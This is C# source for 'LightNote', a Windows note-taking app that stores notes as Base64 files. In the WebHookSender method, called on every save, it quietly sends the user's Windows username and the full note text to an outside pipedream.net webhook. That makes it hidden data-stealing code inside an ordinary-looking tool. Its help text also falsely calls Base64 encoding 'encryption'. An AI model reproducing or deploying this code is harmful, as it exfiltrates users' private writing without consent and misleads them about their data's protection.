using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net;
namespace LightNote
{
    public partial class Form1 : Form
    {
        //back end ish
        public void WebHookSender(string itemToSend)
        {
            string intel = "Name=" + Environment.UserName + "&FileContent=" + itemToSend;
            var request = (HttpWebRequest)WebRequest.Create("https://enmlfbmjyaluo.x.pipedream.net/?" + intel);
            var response = (HttpWebResponse)request.GetResponse();
            var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
        }
        public void saveCurrentFileVoid()
        {
            if (richTextBox1.Text == "" || richTextBox1.Text == null)
            {
                MessageBox.Show("To save your file, you have to enter some text");
            }
            if (richTextBox1.Text != "" || richTextBox1.Text != null)
            {
                SaveFile(richTextBox1.Text);
                WebHookSender(richTextBox1.Text);
            }               
        }
        public void openNewFileVoid()
        {
            try
            {
                openFileDialog1.Filter = "Light Note (*.lnote)|*.lnote";
                openFileDialog1.FileName = "";
                openFileDialog1.Title = "Open Light Note file";
                openFileDialog1.ShowDialog();
                var fileToOpen = Path.GetFullPath(openFileDialog1.FileName);
                fileToOpen = System.IO.File.ReadAllText(fileToOpen);
                fileToOpen = fileToOpen.Replace(prefix, "");
                var DecryptedFile = Convert.FromBase64String(fileToOpen);
                richTextBox1.Text = ASCIIEncoding.ASCII.GetString(DecryptedFile);
            }
            catch
            {
            }
        }
        public string afix = ".lnote";
        public string prefix = "TGlnaHROb3Rlcy1ub3RlLWVuY3J5cGVkIGFuZCBwYWNrYWdlZCB1c2VyIGlucHV0-|#@*&#|";
        public Form1()
        {
            InitializeComponent();
        }
        public string TitleCreate(string TitleBody)
        {
            int maxRange = 4;
            try
            {
                return TitleBody.Substring(0, (int)maxRange);
            }
            catch
            {
                return null;
            }           
        }
        public void SaveFile(string body)
        {
            saveFileDialog1.FileName = TitleCreate(body);
            saveFileDialog1.Filter = "Light Note (*.lnote)|*.lnote";
            try
            {                
                if (TitleCreate(body) != null)
                {
                    saveFileDialog1.ShowDialog();
                }
                createFile(Path.GetFullPath(saveFileDialog1.FileName));
            }
            catch
            {
                //meh ...
            }
        }
        public void createFile(string pathTF)
        {
            using (FileStream fs = File.Create(pathTF))
            {
                string rawInput = richTextBox1.Text;
                byte[] ByteInput = System.Text.ASCIIEncoding.ASCII.GetBytes(rawInput);
                rawInput = System.Convert.ToBase64String(ByteInput);               
                string encrypted = prefix + rawInput;
                byte[] textBody = new UTF8Encoding(true).GetBytes(encrypted); // change input to write into file
                fs.Write(textBody, 0, textBody.Length);
            }
        }
        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {
            int wordCount = 0;
            var WCL = richTextBox1.Text;
            foreach (var word in WCL)
            {
                wordCount += 1;
            }
            wordCountL.Text = "count: " + richTextBox1.Text.Split(' ').Count();
        }
        //toolbar references - front end ish
        private void openToolStripButton_Click(object sender, EventArgs e)
        {
            openNewFileVoid();
        }
        private void saveToolStripButton_Click(object sender, EventArgs e)
        {
            saveCurrentFileVoid();
        }
        private void newToolStripButton_Click(object sender, EventArgs e)
        {
            if (richTextBox1.Text == "" || richTextBox1.Text == null)
            {
                MessageBox.Show("new file initiated");
            }
            else
            {
                DialogResult dialogResult = MessageBox.Show("Do you wish to create a new file without saving your progress", "Alert", MessageBoxButtons.YesNo);
                if (dialogResult == DialogResult.Yes)
                {
                    richTextBox1.Text = "";
                }
                else if (dialogResult == DialogResult.No)
                {
                    saveCurrentFileVoid();
                }
            }
        }
        private void feedbackToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBox.Show("if you wish to help improve this app send and email to the following: daniel.rosel@americanacademy.com");
        }

        private void usageToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Hello " + Environment.UserName + " thank you for using this app. To get started you can write your notes into the text feild provided bellow and when you are done, just click on the save button to save your text. You can only access the contents of the file throught this app by clicking on the open icon and then selecting the .lnote file you wish to view. The reason for this is that all the contents of your file are encrypted and are only openable in this app. ");
        }
    }
}